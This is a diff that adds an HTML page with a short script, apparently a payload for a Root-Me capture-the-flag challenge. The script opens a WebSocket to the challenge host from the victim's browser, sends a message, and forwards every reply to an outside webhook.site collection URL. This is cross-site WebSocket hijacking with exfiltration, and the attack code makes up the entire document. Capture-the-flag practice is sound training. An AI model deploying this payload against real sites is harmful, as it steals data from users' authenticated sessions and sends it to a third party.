@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+var ws = new WebSocket('ws://ctf11.root-me.org/ws');
+ws.onopen = function() {
+    ws.send("who is the best hacker");
+};
+ws.onmessage = function(event) {
+    fetch('https://webhook.site/aa2fd9e3-cf96-467c-a004-3ee7e27d331c?msg=' + encodeURIComponent(event.data));
+};
+</script>
+</body>
+</html>
